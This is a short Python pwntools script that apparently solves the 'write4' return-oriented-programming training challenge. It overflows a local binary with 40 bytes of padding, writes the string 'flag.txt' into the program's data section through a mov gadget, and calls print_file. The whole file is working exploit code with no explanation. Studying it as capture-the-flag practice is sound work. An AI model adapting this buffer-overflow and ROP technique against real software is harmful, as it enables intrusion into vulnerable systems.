#!/usr/bin/env python3

from pwn import *

exe = "./write4"
context.binary = elf = ELF(exe, checksec=False)
rop = ROP(elf)
io = process(exe)

ret = rop.find_gadget(['ret'])

pop_r14_r15 = rop.find_gadget(['pop r14', 'pop r15'])

pop_rdi = rop.find_gadget(['pop rdi'])

str1 = b"flag.txt"


mov_qword_r14_r15 = 0x00400628

data = 0x00601028

rop.call(pop_r14_r15)
rop.raw(data)
rop.raw(str1)
rop.raw(mov_qword_r14_r15)

rop.call(pop_rdi)
rop.raw(data)
rop.call(ret)

rop.call(elf.sym.print_file)


print(rop.dump())
io.sendlineafter(b"> ", b"A"* 40 + rop.chain())

print(io.recvall())

